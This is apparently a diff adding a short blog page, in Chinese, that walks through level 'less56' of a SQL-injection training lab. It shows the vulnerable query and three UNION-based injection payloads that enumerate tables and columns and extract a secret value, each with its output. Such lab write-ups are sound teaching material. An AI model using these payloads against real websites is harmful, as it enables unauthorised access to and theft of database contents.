@@ -1,0 +1,16 @@
+<hr>
+<h2 id="title-less56url-https-www-yuque-com-u29002979-ep2zrx-gqdzc8hqn8h4agsb"><a href="#title-less56url-https-www-yuque-com-u29002979-ep2zrx-gqdzc8hqn8h4agsb" class="headerlink" title="title: less56url: https://www.yuque.com/u29002979/ep2zrx/gqdzc8hqn8h4agsb"></a>title: less56<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/gqdzc8hqn8h4agsb">https://www.yuque.com/u29002979/ep2zrx/gqdzc8hqn8h4agsb</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
+</code></pre>
+<p>此关闭合方式为’),在十四次之内找到通关密码即可</p>
+<pre><code class="bash">爆破数据表 
+?id=-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 
+数据表：2f9r4ilh2y
+
+爆破数据字段
+ ?id=-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;2f9r4ilh2y&#39;--+ 
+字段：secret_BL6H
+
+获取密码
+?id=-1&#39;) union select 1,2,(select secret_BL6H from 2f9r4ilh2y)--+
+密码：eOSw9qFmolZQu7VpE0ipHRV4
+</code></pre>
